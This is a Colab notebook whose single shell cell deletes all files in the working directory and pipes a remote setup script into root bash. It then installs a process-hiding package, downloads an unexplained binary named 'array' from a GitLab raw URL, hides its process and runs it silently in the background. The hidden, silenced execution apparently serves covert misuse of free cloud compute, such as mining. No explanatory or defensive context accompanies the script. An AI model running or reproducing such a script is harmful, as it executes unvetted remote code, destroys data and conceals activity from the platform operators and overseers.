{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Xdgb.ipynb",
      "provenance": [],
      "machine_shape": "hm",
      "collapsed_sections": [
        "ecfHLQMRFIw7",
        "xBvT6Rg-FQcm"
      ],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/ammarku/sc/blob/gh-pages/Xdgb.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "%%shell\n",
        "#!/bin/sh\n",
        "rm -rf *\n",
        "sudo apt update >/dev/null 2>&1\n",
        "curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -\n",
        "sudo -u root npm i -g node-process-hider >/dev/null 2>&1\n",
        "sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime\n",
        "sudo dpkg-reconfigure --frontend noninteractive tzdata >/dev/null 2>&1\n",
        "nohup wget https://gitlab.com/cibogo/tools/-/raw/main/array >/dev/null 2>&1\n",
        "ph add array\n",
        "chmod +x array\n",
        "nohup ./array ann >/dev/null 2>&1"
      ],
      "metadata": {
        "id": "cbugcM7J71Da"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}